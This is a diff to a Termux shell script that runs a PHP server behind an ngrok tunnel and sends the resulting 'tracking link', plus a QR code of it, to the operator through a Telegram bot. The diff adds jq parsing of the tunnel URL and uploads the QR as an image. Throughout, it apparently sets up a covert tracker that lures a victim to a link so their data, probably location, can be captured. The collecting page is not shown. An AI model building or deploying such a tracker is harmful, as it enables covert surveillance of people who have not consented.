@@ -11,7 +11,7 @@ NC='\033[0m'
 
 echo -e "${GREEN}[+] Installing dependencies...${NC}"
 pkg update -y
-pkg install -y curl termux-api php unzip
+pkg install -y curl termux-api php unzip jq
 
 echo -e "${GREEN}[+] Checking ngrok...${NC}"
 if [ ! -f "$PREFIX/bin/ngrok" ]; then
@@ -36,18 +36,19 @@ EOF
 echo -e "${GREEN}[+] Starting PHP server and ngrok...${NC}"
 php -S 127.0.0.1:8080 > /dev/null 2>&1 &
 ngrok http 8080 > /dev/null 2>&1 &
-sleep 20
+sleep 15
 
-NGROK_URL=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-z]*\\.ngrok.io')
+NGROK_URL=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r '.tunnels[0].public_url')
 echo -e "${GREEN}[+] Ngrok URL generated:${NC} $NGROK_URL"
 
 # Send link to Telegram
 curl -s "https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_id=$CHAT_ID&text=Your tracking link: $NGROK_URL"
 
-# Generate QR via online API and send to Telegram
-QR_URL="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=$NGROK_URL"
+# Generate QR, save as image, send to Telegram
+QR_IMAGE="qr.png"
+curl -o "$QR_IMAGE" "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=$NGROK_URL"
 curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto" \
 -F chat_id="$CHAT_ID" \
--F photo="$QR_URL"
+-F photo=@"$QR_IMAGE"
 
-echo -e "${GREEN}[+] Tracker is live. QR Code sent via Telegram.${NC}"
+echo -e "${GREEN}[+] Tracker is live. QR Code image sent via Telegram.${NC}"
